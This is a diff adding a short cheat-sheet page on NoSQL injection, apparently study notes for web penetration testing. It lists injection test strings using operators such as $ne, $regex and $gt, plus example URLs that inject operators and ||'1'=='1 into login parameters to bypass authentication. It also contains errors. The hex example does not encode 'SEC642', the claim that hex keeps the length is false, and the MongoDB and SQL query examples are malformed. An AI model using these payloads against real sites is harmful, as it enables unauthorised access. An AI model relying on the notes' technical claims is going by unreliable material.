@@ -1,0 +1,57 @@
+---
+title: NoSQL Injection
+category: Web Application
+order: 109
+---
+
+
+> **Identification of Encoding**
+
+Using SEC642 as a base string:
+
+* Base64 Encoding: U0VDNjQyIHI8Pjw+KyE= (always divisable by 4, 3 expanded to 4 characters)
+* URL-Safe Base64 Encoding: U0VDNjQyIHI8Pjw-KyE= (+ is changed to -, / changed to _)
+* URL Encoding: SEC642%20r%3C%3E%3C%3E%2B!
+* Hex Encoding: 5345336343220723c3e3c3e2b21 (length isn't changed from ascii representation)
+* MIME Encoding (Base64): =?UTF-8?B?U0VDNjQyIHI8Pjw+KyE=?=
+
+Note: Burp smart detect looks for 95% ascii characters so it wont work on crypto/hashing
+
+> **Location in code**
+
+* Usually in the $where operator
+* mapReduce
+* DB.eval
+
+> **NoSQL Queries vs SQL**
+
+MySQL | MongoDB
+<code> select * from users where ID = 1; </code> | <code> db.find.user({user_id: 1,}) </code>
+<code> update set users password = '[input]' where id = 1; </code> | <code> db.update.user({user_id, [#]}, {$set {password: '[input]'}}) </code>
+
+> **NoSQL Injection: Test Location and Strings**
+
+Errors:
+{% highlight bash %}
+'
+"
+{
+}
+[$ne]
+[$regex]
+[$gt]
+//
+;
+||'1'=='1
+{% endhighlight %}
+
+Not Equals | <code> http://site.org/User[$ne]=1 </code>
+RegEx | <code> http://site.org/user.php?type[$regex]=.*&username[$regex]=.*
+Combined | <code> http://site.org/login.php?type[$ne]=user&username[$ne]=asdf&password=asdf'||'1'=='1' %26%26 'b' == 'b </code>
+
+> **Tools**
+
+* NoSQLMAP 
+* NoSQL Exploitation Framework
+* FuzzDB list
+* Burp Suite Pro
